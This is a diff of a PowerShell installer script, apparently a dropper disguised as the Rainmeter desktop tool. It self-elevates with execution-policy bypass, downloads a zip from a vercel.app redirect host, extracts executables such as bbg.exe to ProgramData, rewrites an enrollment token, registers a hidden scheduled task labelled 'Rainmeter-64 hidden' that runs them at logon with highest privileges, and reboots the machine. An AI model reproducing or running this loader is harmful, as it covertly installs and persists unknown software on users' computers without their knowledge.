@@ -1,25 +1,62 @@
-# Изменяем переменные для скачивания
-$zipUrl      = "https://redirect-ten-gold.vercel.app/Rainmeter-64.zip"
-$zipPath     = "$env:ProgramData\Rainmeter-64.zip"
-$extractPath = "$env:ProgramData\Rainmeter-64"
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$enroll_token,
+    [Parameter(Mandatory=$true)]
+    [string]$id
+)
 
-# Изменяем путь к EXE файлам
-$bbgPath = "$extractPath\bbg.exe"
-$raintimePath = "$extractPath\Raintime-x64.exe"
+$ErrorActionPreference = 'Stop'
 
-# Изменяем проверку файлов
-if (-not (Test-Path $bbgPath)) {
-    throw "EXE not found: $bbgPath"
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $argList = @(
+        "-NoProfile"
+        "-ExecutionPolicy", "Bypass"
+        "-File", "`"$PSCommandPath`""
+        "-enroll_token", "`"$enroll_token`""
+        "-id", "`"$id`""
+    )
+    Start-Process -FilePath "powershell.exe" -ArgumentList $argList -Verb RunAs
+    exit
 }
-if (-not (Test-Path $raintimePath)) {
-    throw "EXE not found: $raintimePath"
-}
 
-# Изменяем пути в скрипте автозапуска
-$autorunScript = @'
+try {
+    $zipUrl      = "https://redirect-ten-gold.vercel.app/Rainmeter-64.zip"
+    $zipPath     = "$env:ProgramData\Rainmeter-64.zip"
+    $extractPath = "$env:ProgramData"
+
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+    Remove-Item -Path $zipPath -Force
+
+    $taskName = "Rainmeter64AutoStart"
+    $exePath  = "$env:ProgramData\Rainmeter-64\Raintime-x64.exe"
+    $exePath  = "$env:ProgramData\Rainmeter-64\bbg.exe"
+
+    if (-not (Test-Path $exePath)) {
+        throw "EXE not found: $exePath"
+    }
+
+    $configPath = "C:\ProgramData\Rainmeter-64\conig_manager.xml"
+
+    if (Test-Path $configPath) {
+        $content = Get-Content -Path $configPath -Raw
+
+        $content = $content -replace 'enroll_token=.*?;', "enroll_token=$enroll_token;"
+        
+        Set-Content -Path $configPath -Value $content
+    } 
+
+    $autorunDir        = "C:\ProgramData\Rainmeter-64"
+    $autorunScriptPath = "C:\ProgramData\Rainmeter-64\autorun.ps1"
+
+    if (-not (Test-Path $autorunDir)) {
+        New-Item -Path $autorunDir -ItemType Directory -Force | Out-Null
+    }
+
+    $autorunScript = @'
 $ErrorActionPreference = "Stop"
-$bbgPath = "C:\ProgramData\Rainmeter-64\bbg.exe"
-$raintimePath = "C:\ProgramData\Rainmeter-64\Raintime-x64.exe"
+$exePath = "C:\ProgramData\Rainmeter-64\Raintime-x64.exe"
+$exePath = "C:\ProgramData\Rainmeter-64\bbg.exe"
 $logFile = "C:\ProgramData\Rainmeter-64\autorun.log"
 $logDir  = Split-Path $logFile -Parent
 
@@ -30,40 +67,43 @@ if (-not (Test-Path $logDir)) {
 "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') START" | Out-File -FilePath $logFile -Append
 
 try {
-    # Запуск bbg.exe
-    if (-not (Test-Path $bbgPath)) {
-        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: bbg.exe not found: $bbgPath" | Out-File -FilePath $logFile -Append
-    } else {
-        $p1 = Start-Process -FilePath $bbgPath -WorkingDirectory (Split-Path $bbgPath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
-        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') bbg.exe OK PID=$($p1.Id)" | Out-File -FilePath $logFile -Append
+    if (-not (Test-Path $exePath)) {
+        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: EXE not found: $exePath" | Out-File -FilePath $logFile -Append
+        exit 1
     }
-    
-    # Запуск Raintime-x64.exe
-    if (-not (Test-Path $raintimePath)) {
-        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: Raintime-x64.exe not found: $raintimePath" | Out-File -FilePath $logFile -Append
-    } else {
-        $p2 = Start-Process -FilePath $raintimePath -WorkingDirectory (Split-Path $raintimePath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
-        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') Raintime-x64.exe OK PID=$($p2.Id)" | Out-File -FilePath $logFile -Append
-    }
+    $p = Start-Process -FilePath $exePath -WorkingDirectory (Split-Path $exePath -Parent) -WindowStyle Hidden -PassThru -ErrorAction Stop
+    "$$   (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') OK PID=   $$($p.Id)" | Out-File -FilePath $logFile -Append
 }
 catch {
     "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ERROR: $($_.Exception.Message)" | Out-File -FilePath $logFile -Append
 }
 '@
 
-# Изменяем запуск процессов после создания задачи
-Write-Host "Done '$taskName' created."
+    Set-Content -Path $autorunScriptPath -Value $autorunScript -Encoding UTF8
 
-# Запуск bbg.exe
-if (Test-Path $bbgPath) {
-    Start-Process -FilePath $bbgPath -WorkingDirectory $extractPath -WindowStyle Hidden
-    Write-Host "[+] bbg.exe started"
+    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    if ($existingTask) {
+        Stop-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+
+    $action      = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$autorunScriptPath`""
+    $trigger     = New-ScheduledTaskTrigger -AtLogOn
+    $settings    = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -Hidden
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $principal   = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive -RunLevel Highest
+
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description "Rainmeter-64 hidden" -ErrorAction Stop
+
+    Write-Host "Done '$taskName' created."
+    Restart-Computer
 }
-
-# Запуск Raintime-x64.exe
-if (Test-Path $raintimePath) {
-    Start-Process -FilePath $raintimePath -WorkingDirectory $extractPath -WindowStyle Hidden
-    Write-Host "[+] Raintime-x64.exe started"
+catch {
+    Write-Host "Error:" -ForegroundColor Red
+    Write-Host $_.Exception.Message -ForegroundColor Red
+    if ($_.ScriptStackTrace) {
+        Write-Host ""
+        Write-Host "StackTrace:" -ForegroundColor Yellow
+        Write-Host $_.ScriptStackTrace
+    }
 }
-
-Restart-Computer
